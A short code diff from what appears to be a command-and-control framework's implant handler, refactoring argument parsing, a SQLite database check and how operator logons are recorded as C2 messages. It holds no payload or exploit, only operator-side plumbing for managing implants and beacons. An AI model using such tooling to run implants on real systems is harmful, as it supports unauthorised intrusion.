         parser.add_argument('-u', '--user', help='the user for this session')
-        parser.add_argument('-a', '--autohide', help='to autohide implants after 30 inactive beacons', action='store_true')
+        parser.add_argument('-a', '--autohide', help='to autohide implants after 30 inactive beacons',
+                            action='store_true')
         args = parser.parse_args(args)
         user = args.user
         autohide = args.autohide
+
     while not user:
         print(Colours.GREEN + "A username is required for logging")
         user = input("Enter your username: ")
-    if DatabaseType == DBType.SQLite and not os.path.isfile(Database):
+
+    if DatabaseType == "SQLite" and not os.path.isfile(Database.split("sqlite:///")[1]):
         print(Colours.RED + "The project database has not been created yet")
         sys.exit()
-    database_connect()
-    new_c2_message("%s logged on." % user)
+
+    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+    c2_message = C2Message(
+        message=f"\n{Colours.BLUE}{now}: {user} logged on.{Colours.END}\n",
+        read="No"
+    )
+
+    insert_object(c2_message)
     clear()
     implant_handler_command_loop(user, "", autohide)
 
